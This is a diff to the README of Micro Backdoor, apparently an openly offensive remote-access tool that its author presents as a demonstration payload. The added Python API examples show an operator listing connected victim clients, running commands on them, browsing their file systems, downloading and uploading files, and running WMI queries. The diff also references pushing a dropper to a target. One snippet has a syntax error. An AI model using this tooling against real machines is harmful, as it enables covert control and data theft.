@@ -8,8 +8,9 @@ I'm using Micro Backdoor mostly for demonstration purposes as payload for [my fi
 [General information](#general-information)  
 [Web interface screenshots](#web-interface-screenshots)  
 [Configuring the server](#configuring-the-server)  
+[Using Python API](#using-python-api)  
 [Deploying the server](#deploying-the-server)  
-[Building Docker container](#building-docker-container)
+[Building Docker container](#building-docker-container)  
 [Configuring the client](#configuring-the-client)  
 
 ## General information
@@ -139,6 +140,93 @@ Update Micro Backdoor on the client:
 
 ```     
 $ ./server.py --client <target_ID> --update <dropper_path>
+```
+
+
+## Using Python API
+
+As it was mentioned above, Micro Backdoor server is also providing Python API to interact with connected clients which is useful for various automation and scripting. Here's some examples how to use this API.  
+
+Obtain and print connected clients list:
+
+```python
+from server import ClientHelper
+
+# get clients list
+clients = ClientHelper().client_list()
+
+for client in clients:
+
+    # print client information
+    print('ID = %s, addr = %s' % (client.client_id, client.addr[0]))
+
+```
+
+Execute console command on the client:
+
+```python
+
+# create client helper instance
+client = ClientHelper(client_id)
+
+# connect to the corresponding child process of the server
+client.mapper_connect()
+
+# execute console command
+output, exit_code = client.execute('whoami')
+
+```
+
+Work with the file system:
+
+```python
+
+# create client helper instance
+client = ClientHelper(client_id)
+
+# connect to the corresponding child process of the server
+client.mapper_connect()
+
+# enumerate files in specified directory
+for size, name in client.file_list('C:\\'):
+
+    if size is None:
+
+        # print directory name
+        print(' DIR: %s' % name)
+
+    else
+
+        # print file name and size
+        print('FILE: %s [%d bytes]' % (name, size))
+
+# download "C:\Windows\win.ini" file from the client
+client.file_get('C:\\Windows\\win.ini', '/tmp/win.ini')
+
+# upload "/tmp/example.txt" file to the client
+client.file_put('C:\\Users\\Test\\example.txt', '/tmp/example.txt')
+
+```
+
+Execute WMI query and print all of the class members
+
+```python
+
+# create client helper instance
+client = ClientHelper(client_id)
+
+# connect to the corresponding child process of the server
+client.mapper_connect()
+
+# get CIM_OperatingSystem WMI class
+for name, value in client.execute_wmi('os').items():
+
+    # print class member name and value
+    print('%s = %s' % (name, value))
+
+# get "Caption" class member value
+os_name = client.execute_wmi('os', props = 'Caption')
+
 ```
 
 
